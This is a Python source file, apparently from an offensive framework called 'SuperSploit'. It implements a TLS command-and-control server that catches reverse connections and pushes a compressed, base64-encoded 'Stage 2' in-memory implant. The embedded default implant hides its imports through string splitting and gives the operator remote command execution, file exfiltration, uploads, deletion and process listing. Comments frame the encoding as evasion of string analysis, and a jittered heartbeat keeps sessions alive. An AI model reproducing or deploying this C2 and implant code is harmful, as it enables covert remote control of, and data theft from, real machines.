import os
import socket
import ssl
import struct
import subprocess
import threading
import time
import random
import base64
import zlib

from prompt_toolkit import prompt as input
from .database import DatabaseManagment
from .ToStdOut import ToStdout

write = ToStdout.write

class Listener:
    active_listener_socket = None
    active_sessions = {}
    session_counter = 1

    @classmethod
    def start(cls, database, deploy_stage2=False):
        """
        Native Raw Socket Listener. Acts as the C2 Server.
        Catches incoming connections, auto-deploys Stage 2 fileless payloads, and drops into an interactive shell.
        """
        # Clean up any dangling listener from a previous exploit run
        if cls.active_listener_socket:
            write("[*] Terminating previous background listener to free the port...")
            old_socket = cls.active_listener_socket
            cls.active_listener_socket = None  # Signal the background thread to stop
            
            try:
                # Forcibly break the blocking accept() call immediately
                old_socket.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                old_socket.close()
            except Exception:
                pass
            time.sleep(1.0)  # Wait for the old thread's timeout to trigger and fully release the binding
            
        # Prefer LPORT/LHOST for reverse listeners, aligning with the payload generator defaults
        port = database.get("LPORT", database.get("L_PORT", "5000"))
        host = database.get("LHOST", database.get("L_HOST", "0.0.0.0"))

        def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
            try:
                # Enable OS-level TCP Keepalives to handle dropped network packets
                raw_client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                try:
                    if hasattr(socket, 'TCP_KEEPIDLE'):
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
                    elif hasattr(socket, 'TCP_KEEPALIVE'):
                        # macOS specific TCP keepalive
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 60)
                except Exception:
                    pass

                client = context.wrap_socket(raw_client, server_side=True)
                write(f"\n\n[+] Secure TLS connection established from {addr[0]}:{addr[1]}")

                if deploy_stage2_flag:
                    write("[*] Connection caught! Packaging and encrypting Stage 2 in-memory C2...")
                    
                    # OPSEC: Zlib compress the Python script to bypass basic string analysis.
                    # This avoids the cross-version fragility of using marshal, as the payload 
                    # will be dynamically compiled using compile() directly on the target's specific Python runtime.
                    try:
                        compressed_code = zlib.compress(stage2_code)
                        # Base64 encode the compressed payload before sending it over the wire
                        encoded_stage2 = base64.b64encode(compressed_code)
                    except Exception as e:
                        write(f"[-] Failed to compress Stage 2 payload: {e}")
                        # Fallback to cleartext if compression fails
                        encoded_stage2 = base64.b64encode(stage2_code)
                    
                    length_header = struct.pack('>I', len(encoded_stage2))
                    client.sendall(length_header + encoded_stage2)
                    write(f"[*] Stage 2 payload sent over TLS to {addr[0]}:{addr[1]}.")

                # Register the active session
                session_id = cls.session_counter
                cls.session_counter += 1
                cls.active_sessions[session_id] = {
                    "socket": client,
                    "addr": addr
                }
                
                write(f"[+] Background Session {session_id} opened! Type 'sessions -i {session_id}' to interact.\n")
                
                # Fetch the initialization banner
                client.settimeout(5.0)
                try:
                    banner = client.recv(4096).decode('utf-8', errors='ignore').strip()
                    if banner:
                        write(f"[Session {session_id}]: {banner}")
                except socket.timeout:
                    pass
                client.settimeout(None)

            except Exception as e:
                write(f"\n[-] Failed to handle client {addr}: {e}")

        def listener_thread():
            try:
                # --- SSL/TLS Certificate Generation ---
                cert_dir = os.path.join(DatabaseManagment.getInstall(), ".data", ".config")
                cert_path = os.path.join(cert_dir, "c2_cert.pem")
                key_path = os.path.join(cert_dir, "c2_key.pem")

                # Auto-generate an ephemeral self-signed cert if it doesn't already exist
                if not os.path.exists(cert_path) or not os.path.exists(key_path):
                    write("[*] Generating ephemeral self-signed SSL/TLS certificate...")
                    subprocess.run([
                        "openssl", "req", "-x509", "-newkey", "rsa:4096", "-keyout", key_path,
                        "-out", cert_path, "-days", "365", "-nodes", "-subj", "/CN=supersploit.c2"
                    ], check=True, capture_output=True)

                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile=cert_path, keyfile=key_path)

                # Create a raw TCP socket listener
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # DEBUG TIP: SO_REUSEADDR tells the OS kernel to release the port immediately if the 
                # framework crashes. Without this, you get "Address already in use" errors for ~60 seconds.
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Add SO_REUSEPORT for macOS/BSD to forcefully allow binding if the port is held by a stale session
                try:
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                except AttributeError:
                    pass
                
                # Register the active socket so future executions can clean it up
                cls.active_listener_socket = server
                
                # Robust Binding Loop to handle OS-level socket reclamation delays
                bound = False
                for _ in range(5):
                    try:
                        server.bind((host, int(port)))
                        bound = True
                        break
                    except OSError as e:
                        if getattr(e, 'errno', None) == 48 or "Address already in use" in str(e):
                            time.sleep(1)
                        else:
                            raise e
                            
                if not bound:
                    write(f"\n[!] Fatal: Could not bind to {host}:{port}. Address still in use.")
                    cls.active_listener_socket = None
                    return

                server.listen(5)
                server.settimeout(0.5)  # Unblock accept() every 0.5s to check for termination signals
                write(f"\n[*] SSL/TLS background listener active on {host}:{port}. Waiting for connections...")

                # Pre-load Stage 2 code to avoid disk I/O on every connection
                stage2_code = b""
                if deploy_stage2:
                    stage_two_path = database.get("STAGE_TWO", "")
                    if stage_two_path and os.path.exists(stage_two_path):
                        with open(stage_two_path, "rb") as file:
                            stage2_code = file.read()
                    else:
                        write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
                        stage2_code = b"""def run_c2():\n    global client_socket\n    os_mod = __import__('o' + 's')\n    subp_mod = __import__('sub' + 'process')\n    os_chdir = getattr(os_mod, 'ch' + 'dir')\n    os_getcwd = getattr(os_mod, 'get' + 'cwd')\n    os_listdir = getattr(os_mod, 'list' + 'dir')\n    os_remove = getattr(os_mod, 're' + 'move')\n    os_path = getattr(os_mod, 'pa' + 'th')\n    os_path_exists = getattr(os_path, 'exi' + 'sts')\n    subp_run = getattr(subp_mod, 'ru' + 'n')\n    while True:\n        try:\n            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()\n            if not cmd or cmd.lower() == 'exit': break\n            if cmd.startswith('cd '):\n                try: os_chdir(cmd[3:].strip())\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                else: client_socket.send(b"\\n")\n                continue\n            elif cmd == 'pwd':\n                try: client_socket.send((os_getcwd() + "\\n").encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd == 'ls' or cmd.startswith('ls '):\n                target_dir = cmd[3:].strip() or '.'\n                try:\n                    files = os_listdir(target_dir)\n                    out = '\\n'.join(files) if files else ' '\n                    client_socket.send((out + "\\n").encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('cat '):\n                try:\n                    with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:\n                        out = f.read()\n                        client_socket.send((out if out else ' \\n').encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('rm '):\n                try:\n                    os_remove(cmd[3:].strip())\n                    client_socket.send(b"File removed.\\n")\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('download '):\n                target_file = cmd[9:].strip()\n                try:\n                    if not os_path_exists(target_file):\n                        client_socket.send(b"ERROR: File not found.\\n")\n                        continue\n                    with open(target_file, 'rb') as f:\n                        data = f.read()\n                        import struct\n                        client_socket.sendall(struct.pack('>I', len(data)) + data)\n                except Exception as e: client_socket.send(f"ERROR: {e}\\n".encode())\n                continue\n            elif cmd.startswith('upload '):\n                parts = cmd.split(' ', 2)\n                if len(parts) < 3:\n                    client_socket.send(b"ERROR: Usage: upload <remote_path> <file_size>\\n")\n                    continue\n                try:\n                    file_size = int(parts[2])\n                    client_socket.send(b"READY\\n")\n                    data = bytearray()\n                    while len(data) < file_size:\n                        packet = client_socket.recv(file_size - len(data))\n                        if not packet: break\n                        data.extend(packet)\n                    with open(parts[1], 'wb') as f: f.write(bytes(data))\n                    client_socket.send(b"Upload complete.\\n")\n                except Exception as e: client_socket.send(f"ERROR: {e}\\n".encode())\n                continue\n            elif cmd == 'ps':\n                try:\n                    if hasattr(os_mod, 'uname'):\n                        out = "PID\\tNAME\\n"\n                        for pid in os_listdir('/proc'):\n                            if pid.isdigit():\n                                try:\n                                    with open(f"/proc/{pid}/comm", 'r') as f:\n                                        out += f"{pid}\\t{f.read().strip()}\\n"\n                                except Exception: pass\n                        client_socket.send((out if out else ' \\n').encode('utf-8'))\n                    else:\n                        proc = subp_run('tasklist' if os_mod.name == 'nt' else 'ps -A', shell=True, capture_output=True, text=True)\n                        client_socket.send(((proc.stdout + proc.stderr) if (proc.stdout + proc.stderr) else ' \\n').encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            try:\n                proc = subp_run(cmd, shell=True, capture_output=True, text=True)\n                out = proc.stdout + proc.stderr\n                if not out: out = " "\n                client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))\n            except Exception as e: client_socket.send(f"{e}\\n".encode('utf-8'))\n        except Exception:\n            break\nrun_c2()\n"""

                def heartbeat_monitor(bound_server):
                    """Background thread to purge dead sessions using a 1-byte ping."""
                    while cls.active_listener_socket is bound_server:
                        # Introduce jitter by making the wait time random between 45 and 75 seconds
                        jitter_seconds = random.randint(45, 75)
                        for _ in range(jitter_seconds):
                            time.sleep(1)
                            if cls.active_listener_socket is not bound_server:
                                return
                        for sid, info in list(cls.active_sessions.items()):
                            try:
                                # Send a harmless 1-byte space ping to verify the connection
                                info["socket"].send(b" ")
                            except Exception:
                                try:
                                    info["socket"].close()
                                except Exception:
                                    pass
                                if sid in cls.active_sessions:
                                    del cls.active_sessions[sid]

                threading.Thread(target=heartbeat_monitor, args=(server,), daemon=True).start()

                # Infinite accept loop for Multi-Client C2
                while True:
                    # Exit cleanly if we are no longer the active listener
                    if cls.active_listener_socket is not server:
                        break
                        
                    try:
                        raw_client, addr = server.accept()
                        raw_client.settimeout(None)  # Restore blocking mode for the new client connection
                    except socket.timeout:
                        continue
                    except OSError:
                        # Triggered when another exploit run closes this server socket
                        break
                        
                    # Handle the new connection in a separate background thread
                    threading.Thread(
                        target=handle_client,
                        args=(raw_client, addr, deploy_stage2, stage2_code, context),
                        daemon=True
                    ).start()

                # Clean up socket upon thread exit
                server.close()

            except Exception as e:
                # We purposely trigger a Bad file descriptor error when shutting down the old socket, ignore it
                if "Bad file descriptor" not in str(e):
                    write(f"[!] Listener Error: {e}")

        # DEBUG TIP: daemon=True means this thread will automatically be killed if the main 
        # SuperSploit application closes. Without this, the framework would hang indefinitely on exit.
        # Run in a daemon thread so the exploit script can continue running
        threading.Thread(target=listener_thread, daemon=True).start()

    @classmethod
    def interact(cls, session_id):
        session = cls.active_sessions.get(int(session_id))
        if not session:
            write(f"[-] Session {session_id} not found or inactive.")
            return

        client = session["socket"]
        addr = session["addr"]
        write(f"\n[*] Interacting with Session {session_id} ({addr[0]}:{addr[1]})")
        write(f"[*] Type 'background' or 'bg' to return to SuperSploit.\n")

        while True:
            try:
                cmd = input(f"Session {session_id}> ")
                
                if cmd.lower() in ['exit', 'quit']:
                    client.send(b"exit\n")
                    client.close()
                    del cls.active_sessions[int(session_id)]
                    write(f"[*] Session {session_id} closed.")
                    break
                elif cmd.lower() in ['background', 'bg']:
                    write(f"[*] Backgrounding Session {session_id}...")
                    break
                elif not cmd.strip():
                    continue
                    
                client.send((cmd + "\n").encode())

                # Wait for output
                data = client.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    write(f"\n[-] Session {session_id} died unexpectedly.")
                    client.close()
                    del cls.active_sessions[int(session_id)]
                    break
                print(data, end="")
            except Exception as e:
                write(f"\n[-] Session {session_id} connection error: {e}")
                client.close()
                if int(session_id) in cls.active_sessions:
                    del cls.active_sessions[int(session_id)]
                break